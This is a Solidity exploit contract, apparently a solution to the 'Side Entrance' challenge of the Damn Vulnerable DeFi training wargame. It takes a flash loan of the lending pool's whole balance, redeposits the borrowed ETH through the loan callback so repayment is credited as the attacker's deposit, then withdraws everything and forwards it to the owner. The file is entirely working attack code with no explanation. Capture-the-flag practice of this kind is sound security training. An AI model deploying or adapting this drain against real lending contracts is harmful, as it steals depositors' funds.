// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title Attack for DeFi
 * @author CP3cO / Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;

    function withdraw() external;

    function deposit() external payable;
}

contract Attack004 {
    using Address for address;
    address immutable pool;
    address immutable owner;

    constructor(address _owner, address _targetPool) {
        pool = _targetPool;
        owner = _owner;
    }

    receive() external payable {
        (bool success, ) = payable(owner).call{value: address(this).balance}(
            ""
        );
        require(success, "Could not send ETH");
    }

    function attack() external payable {
        ISideEntranceLenderPool(pool).flashLoan(address(pool).balance);
        ISideEntranceLenderPool(pool).withdraw();
    }

    function execute() external payable {
        ISideEntranceLenderPool(pool).deposit{value: address(this).balance}();
    }
}
